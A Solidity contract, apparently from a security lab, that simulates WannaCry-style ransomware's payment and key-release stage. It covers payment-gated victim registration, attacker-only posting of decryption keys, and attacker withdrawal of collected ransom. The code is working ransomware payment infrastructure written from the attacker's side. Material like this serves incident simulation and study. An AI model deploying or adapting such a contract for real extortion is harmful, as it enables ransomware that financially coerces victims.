// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * RansomExchange - WannaCry-style ransom exchange on the lab's private chain.
 *
 * Replaces the original incident's BTC + TOR manual operations:
 *   - the TOR C2 message drop  -> registerVictim() calldata + events
 *   - the C2 key reply         -> submitReply() calldata + events
 *   - manual payment checks    -> the enforced msg.value gate in registerVictim
 *
 * The contract transports bytes without privacy: as the attackers we do not
 * care about victim confidentiality, so nothing is sealed for transport.
 * All coercion-relevant crypto happens off-chain:
 *   - registerVictim posts the victim_priv blob sealed under the attacker's
 *     RSA public key (the real WannaCry lock: only attacker_priv can open it).
 *   - submitReply posts victim_priv in PLAINTEXT — the attacker's decryptor
 *     output. It only appears after the ransom arrived, so there is nothing
 *     to conceal; the victim reads it back and unseals its own file key.
 *
 * Payment enforcement: registerVictim is payable and requires exactly
 * RANSOM_WEI. The EVM itself refuses unpaid registration, which is the
 * on-chain stand-in for the manual "check payment before releasing keys"
 * work the original attackers did by hand.
 */
contract RansomExchange {
    /// Fixed lab ransom: 1 lab ETH per victim. The ChainSeed deployment
    /// utility cannot pass constructor arguments, so the price is a
    /// contract constant; the enforcement itself stays in registerVictim.
    uint256 public constant RANSOM_WEI = 1 ether;

    struct Request {
        address victim;      // msg.sender that registered and paid
        bytes sealedBlob;    // victim_priv sealed under attacker_pub (opaque)
        bool answered;       // attacker reply posted
    }

    /// All recorded requests, in registration order.
    mapping(uint256 => Request) public requests;
    /// Replies per request id: victim_priv in plaintext (payment-gated).
    mapping(uint256 => bytes) public replies;

    uint256 public nextId;
    address public immutable attacker;

    event VictimRegistered(uint256 indexed id, address indexed victim);
    event ReplyPosted(uint256 indexed id, bytes plainReply);

    error AlreadyAnswered();
    error OnlyAttacker();
    error WrongRansomAmount();
    error EmptyPayload();
    error NoReplyYet();

    /**
     * The deployer becomes the attacker. In the lab the utility server's
     * funding account deploys this contract, so that account is designated
     * the attacker address on-chain.
     */
    constructor() {
        attacker = msg.sender;
    }

    /**
     * A victim registers its sealed payload and pays the ransom in one
     * transaction. The payable gate is the enforcement point: without the
     * exact ransom attached the transaction reverts and no request exists.
     */
    function registerVictim(bytes calldata sealedBlob)
        external
        payable
        returns (uint256 id)
    {
        if (msg.value != RANSOM_WEI) revert WrongRansomAmount();
        if (sealedBlob.length == 0) revert EmptyPayload();

        id = nextId++;
        requests[id] = Request({
            victim: msg.sender,
            sealedBlob: sealedBlob,
            answered: false
        });
        emit VictimRegistered(id, msg.sender);
    }

    /**
     * The attacker posts the reply for one paid, unanswered request: the
     * recovered victim_priv, in plaintext. The msg.sender gate is the
     * second enforcement point: even a paid request can only be answered
     * by the designated attacker account.
     */
    function submitReply(uint256 id, bytes calldata plainReply) external {
        if (msg.sender != attacker) revert OnlyAttacker();
        if (requests[id].answered) revert AlreadyAnswered();
        if (requests[id].victim == address(0)) revert EmptyPayload();
        if (plainReply.length == 0) revert EmptyPayload();

        requests[id].answered = true;
        replies[id] = plainReply;
        emit ReplyPosted(id, plainReply);
    }

    /// Victim-side read helper: fetch the attacker's plaintext reply.
    function getReply(uint256 id) external view returns (bytes memory) {
        if (replies[id].length == 0) revert NoReplyYet();
        return replies[id];
    }

    /// The attacker sweeps the collected ransoms off the contract.
    function withdraw() external {
        if (msg.sender != attacker) revert OnlyAttacker();
        uint256 amount = address(this).balance;
        (bool ok, ) = attacker.call{value: amount}("");
        require(ok);
    }
}
